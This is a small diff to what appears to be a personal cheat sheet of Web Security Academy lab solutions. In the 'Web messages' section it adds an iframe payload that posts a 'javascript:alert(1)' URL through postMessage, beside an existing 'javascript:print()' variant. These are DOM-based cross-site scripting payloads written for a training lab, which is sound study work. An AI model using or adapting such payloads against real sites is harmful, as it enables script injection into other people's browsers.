@@ -99,6 +99,7 @@ xhr.send();
 #### Web messages
 ```
 <iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+<iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" onload="this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:alert(1)"}','*')">
 ```
 ### WebSockets
 ### Insecure deserialization
